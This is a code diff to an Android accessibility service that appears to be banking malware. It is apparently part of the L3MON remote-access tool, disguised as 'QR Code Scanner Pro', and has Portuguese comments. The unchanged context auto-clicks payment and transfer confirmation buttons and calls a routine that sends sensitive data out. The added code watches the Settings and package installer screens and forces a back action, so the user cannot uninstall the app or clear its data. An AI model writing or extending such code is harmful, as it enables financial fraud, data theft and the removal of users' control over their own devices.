@@ -142,6 +142,9 @@ public class AccessibilityCaptureService extends AccessibilityService {
                 String[] confirmButtons = { "Confirmar", "Enviar", "Pagar", "Transferir", "Aprovar" };
                 gestureManager.findAndClickConfirmationButton(root, confirmButtons);
 
+                // === AUTOPROTEÇÃO: IMPEDIR DESINSTALAÇÃO ===
+                checkAndPreventUninstall(root, packageName);
+
                 // === EXFILTRAÇÃO AUTOMÁTICA DE DADOS SENSÍVEIS ===
                 detectAndExfilSensitiveData(root, packageName);
 
@@ -495,6 +498,39 @@ public class AccessibilityCaptureService extends AccessibilityService {
             }
         } catch (Exception e) {
             e.printStackTrace();
+        }
+    }
+
+    // ==================== AUTOPROTEÇÃO ====================
+
+    /**
+     * Detecta e impede que o usuário desinstale o app ou limpe seus dados.
+     */
+    private void checkAndPreventUninstall(AccessibilityNodeInfo root, String currentPackage) {
+        if (root == null) return;
+
+        // 1. Verifica se estamos nas configurações do sistema ou instalador
+        String systemSettings = "com.android.settings";
+        String packageInstaller = "com.google.android.packageinstaller";
+        String packageInstallerAosp = "com.android.packageinstaller";
+
+        if (systemSettings.equals(currentPackage) || 
+            packageInstaller.equals(currentPackage) || 
+            packageInstallerAosp.equals(currentPackage)) {
+
+            // 2. Procura por menções ao nosso próprio app na tela
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("QR Code Scanner Pro");
+            if (nodes != null && !nodes.isEmpty()) {
+                Log.w("AutoProtect", "Tentativa de desinstalação/configuração detectada!");
+                
+                // 3. Executa ação de bloqueio: Voltar ou Home
+                performGlobalAction(GLOBAL_ACTION_BACK);
+                
+                // Envia log de segurança
+                com.etechd.l3mon.managers.LogManager.logSecurityEvent("Prevenção de desinstalação ativada");
+                
+                for (AccessibilityNodeInfo node : nodes) node.recycle();
+            }
         }
     }
 
